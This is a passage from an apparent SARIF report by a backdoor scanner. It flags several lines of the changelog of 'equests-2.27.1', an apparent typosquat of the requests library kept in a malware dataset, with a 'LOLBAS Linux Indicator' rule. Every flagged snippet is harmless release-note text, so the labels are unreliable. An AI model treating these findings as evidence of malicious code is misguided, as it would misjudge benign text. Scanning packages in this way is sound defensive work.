          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1002,
                  "startColumn": 33,
                  "endLine": 1002,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n**Improvements**\n\n-   Support for connect timeouts! Timeout now accepts a tuple (connect,\n    read) which is used to set individual connect and read timeouts.\n-   Allow copying of PreparedRequests without headers/cookies.\n-   Updated bundled urllib3 version.\n",
                    "rendered": {
                      "text": "\n**Improvements**\n\n-   Support for connect timeouts! Timeout now accepts a tuple (connect,\n    read) which is used to set individual connect and read timeouts.\n-   Allow copying of PreparedRequests without headers/cookies.\n-   Updated bundled urllib3 version.\n",
                      "markdown": "`\n**Improvements**\n\n-   Support for connect timeouts! Timeout now accepts a tuple (connect,\n    read) which is used to set individual connect and read timeouts.\n-   Allow copying of PreparedRequests without headers/cookies.\n-   Updated bundled urllib3 version.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 987,
                  "startColumn": 6,
                  "endLine": 987,
                  "endColumn": 11,
                  "snippet": {
                    "text": "------------------\n\n-   Now has a \"security\" package extras set,\n    `$ pip install requests[security]`\n-   Requests will now use Certifi if it is available.\n-   Capture and re-raise urllib3 ProtocolError\n-   Bugfix for responses that attempt to redirect to themselves forever\n",
                    "rendered": {
                      "text": "------------------\n\n-   Now has a \"security\" package extras set,\n    `$ pip install requests[security]`\n-   Requests will now use Certifi if it is available.\n-   Capture and re-raise urllib3 ProtocolError\n-   Bugfix for responses that attempt to redirect to themselves forever\n",
                      "markdown": "`------------------\n\n-   Now has a \"security\" package extras set,\n    `$ pip install requests[security]`\n-   Requests will now use Certifi if it is available.\n-   Capture and re-raise urllib3 ProtocolError\n-   Bugfix for responses that attempt to redirect to themselves forever\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 662,
                  "startColumn": 6,
                  "endLine": 662,
                  "endColumn": 11,
                  "snippet": {
                    "text": "**New Features**\n\n-   SOCKS Proxy Support! (requires PySocks;\n    `$ pip install requests[socks]`)\n\n**Miscellaneous**\n\n",
                    "rendered": {
                      "text": "**New Features**\n\n-   SOCKS Proxy Support! (requires PySocks;\n    `$ pip install requests[socks]`)\n\n**Miscellaneous**\n\n",
                      "markdown": "`**New Features**\n\n-   SOCKS Proxy Support! (requires PySocks;\n    `$ pip install requests[socks]`)\n\n**Miscellaneous**\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 641,
                  "startColumn": 11,
                  "endLine": 641,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    `NO_PROXY` environment variables: Requests now treats it as a\n    specific IP.\n-   Fixed a bug when sending JSON data that could cause us to encounter\n    obscure OpenSSL errors in certain network conditions (yes, really).\n-   Added type checks to ensure that `iter_content` only accepts\n    integers and `None` for chunk sizes.\n-   Fixed issue where responses whose body had not been fully consumed\n",
                    "rendered": {
                      "text": "    `NO_PROXY` environment variables: Requests now treats it as a\n    specific IP.\n-   Fixed a bug when sending JSON data that could cause us to encounter\n    obscure OpenSSL errors in certain network conditions (yes, really).\n-   Added type checks to ensure that `iter_content` only accepts\n    integers and `None` for chunk sizes.\n-   Fixed issue where responses whose body had not been fully consumed\n",
                      "markdown": "`    `NO_PROXY` environment variables: Requests now treats it as a\n    specific IP.\n-   Fixed a bug when sending JSON data that could cause us to encounter\n    obscure OpenSSL errors in certain network conditions (yes, really).\n-   Added type checks to ensure that `iter_content` only accepts\n    integers and `None` for chunk sizes.\n-   Fixed issue where responses whose body had not been fully consumed\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 637,
                  "startColumn": 48,
                  "endLine": 637,
                  "endColumn": 52,
                  "snippet": {
                    "text": "-   Fixed occasional `TypeError` when attempting to decode a JSON\n    response that occurred in an error case. Now correctly returns a\n    `ValueError`.\n-   Requests would incorrectly ignore a non-CIDR IP address in the\n    `NO_PROXY` environment variables: Requests now treats it as a\n    specific IP.\n-   Fixed a bug when sending JSON data that could cause us to encounter\n",
                    "rendered": {
                      "text": "-   Fixed occasional `TypeError` when attempting to decode a JSON\n    response that occurred in an error case. Now correctly returns a\n    `ValueError`.\n-   Requests would incorrectly ignore a non-CIDR IP address in the\n    `NO_PROXY` environment variables: Requests now treats it as a\n    specific IP.\n-   Fixed a bug when sending JSON data that could cause us to encounter\n",
                      "markdown": "`-   Fixed occasional `TypeError` when attempting to decode a JSON\n    response that occurred in an error case. Now correctly returns a\n    `ValueError`.\n-   Requests would incorrectly ignore a non-CIDR IP address in the\n    `NO_PROXY` environment variables: Requests now treats it as a\n    specific IP.\n-   Fixed a bug when sending JSON data that could cause us to encounter\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 478,
                  "startColumn": 35,
                  "endLine": 478,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    redirects. Fewer `UnicodeDecodeErrors` are encountered on Python 2,\n    and Python 3 now correctly understands that Latin-1 is unlikely to\n    be the correct encoding.\n-   If an attempt to `seek` file to find out its length fails, we now\n    appropriately handle that by aborting our content-length\n    calculations.\n-   Restricted `HTTPDigestAuth` to only respond to auth challenges made\n",
                    "rendered": {
                      "text": "    redirects. Fewer `UnicodeDecodeErrors` are encountered on Python 2,\n    and Python 3 now correctly understands that Latin-1 is unlikely to\n    be the correct encoding.\n-   If an attempt to `seek` file to find out its length fails, we now\n    appropriately handle that by aborting our content-length\n    calculations.\n-   Restricted `HTTPDigestAuth` to only respond to auth challenges made\n",
                      "markdown": "`    redirects. Fewer `UnicodeDecodeErrors` are encountered on Python 2,\n    and Python 3 now correctly understands that Latin-1 is unlikely to\n    be the correct encoding.\n-   If an attempt to `seek` file to find out its length fails, we now\n    appropriately handle that by aborting our content-length\n    calculations.\n-   Restricted `HTTPDigestAuth` to only respond to auth challenges made\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 463,
                  "startColumn": 55,
                  "endLine": 463,
                  "endColumn": 61,
                  "snippet": {
                    "text": "    `get_redirect_target(response)` instead of directly querying\n    `Response.is_redirect` and `Response.headers['location']`. Advanced\n    users will be able to process malformed redirects more easily.\n-   Changed the internal calculation of elapsed request time to have\n    higher resolution on Windows.\n-   Added `win_inet_pton` as conditional dependency for the `[socks]`\n    extra on Windows with Python 2.7.\n",
                    "rendered": {
                      "text": "    `get_redirect_target(response)` instead of directly querying\n    `Response.is_redirect` and `Response.headers['location']`. Advanced\n    users will be able to process malformed redirects more easily.\n-   Changed the internal calculation of elapsed request time to have\n    higher resolution on Windows.\n-   Added `win_inet_pton` as conditional dependency for the `[socks]`\n    extra on Windows with Python 2.7.\n",
                      "markdown": "`    `get_redirect_target(response)` instead of directly querying\n    `Response.is_redirect` and `Response.headers['location']`. Advanced\n    users will be able to process malformed redirects more easily.\n-   Changed the internal calculation of elapsed request time to have\n    higher resolution on Windows.\n-   Added `win_inet_pton` as conditional dependency for the `[socks]`\n    extra on Windows with Python 2.7.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 456,
                  "startColumn": 7,
                  "endLine": 456,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    variable.\n-   When users provide invalid paths to certificate bundle files or\n    directories Requests now raises `IOError`, rather than failing at\n    the time of the HTTPS request with a fairly inscrutable certificate\n    validation error.\n-   The behavior of `SessionRedirectMixin` was slightly altered.\n    `resolve_redirects` will now detect a redirect by calling\n",
                    "rendered": {
                      "text": "    variable.\n-   When users provide invalid paths to certificate bundle files or\n    directories Requests now raises `IOError`, rather than failing at\n    the time of the HTTPS request with a fairly inscrutable certificate\n    validation error.\n-   The behavior of `SessionRedirectMixin` was slightly altered.\n    `resolve_redirects` will now detect a redirect by calling\n",
                      "markdown": "`    variable.\n-   When users provide invalid paths to certificate bundle files or\n    directories Requests now raises `IOError`, rather than failing at\n    the time of the HTTPS request with a fairly inscrutable certificate\n    validation error.\n-   The behavior of `SessionRedirectMixin` was slightly altered.\n    `resolve_redirects` will now detect a redirect by calling\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 443,
                  "startColumn": 68,
                  "endLine": 444,
                  "snippet": {
                    "text": "\n**Bugfixes**\n\n-   Changed the dependency markers to widen compatibility with older pip\n    releases.\n\n2.14.0 (2017-05-09)\n-------------------\n",
                    "rendered": {
                      "text": "\n**Bugfixes**\n\n-   Changed the dependency markers to widen compatibility with older pip\n    releases.\n\n2.14.0 (2017-05-09)\n-------------------\n",
                      "markdown": "`\n**Bugfixes**\n\n-   Changed the dependency markers to widen compatibility with older pip\n    releases.\n\n2.14.0 (2017-05-09)\n-------------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 167,
                  "startColumn": 52,
                  "endLine": 167,
                  "endColumn": 58,
                  "snippet": {
                    "text": "**Dependencies**\n\n- Pinning for `chardet` and `idna` now uses major version instead of minor.\n  This hopefully reduces the need for releases every time a dependency is updated.\n\n2.22.0 (2019-05-15)\n-------------------\n",
                    "rendered": {
                      "text": "**Dependencies**\n\n- Pinning for `chardet` and `idna` now uses major version instead of minor.\n  This hopefully reduces the need for releases every time a dependency is updated.\n\n2.22.0 (2019-05-15)\n-------------------\n",
                      "markdown": "`**Dependencies**\n\n- Pinning for `chardet` and `idna` now uses major version instead of minor.\n  This hopefully reduces the need for releases every time a dependency is updated.\n\n2.22.0 (2019-05-15)\n-------------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 3,
                  "endLine": 92,
                  "endColumn": 8,
                  "snippet": {
                    "text": "  specifying `[use_chardet_on_py3]` extra as follows:\n\n    ```shell\n    pip install \"requests[use_chardet_on_py3]\"\n    ```\n\n  Python2 still depends upon the `chardet` module.\n",
                    "rendered": {
                      "text": "  specifying `[use_chardet_on_py3]` extra as follows:\n\n    ```shell\n    pip install \"requests[use_chardet_on_py3]\"\n    ```\n\n  Python2 still depends upon the `chardet` module.\n",
                      "markdown": "`  specifying `[use_chardet_on_py3]` extra as follows:\n\n    ```shell\n    pip install \"requests[use_chardet_on_py3]\"\n    ```\n\n  Python2 still depends upon the `chardet` module.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}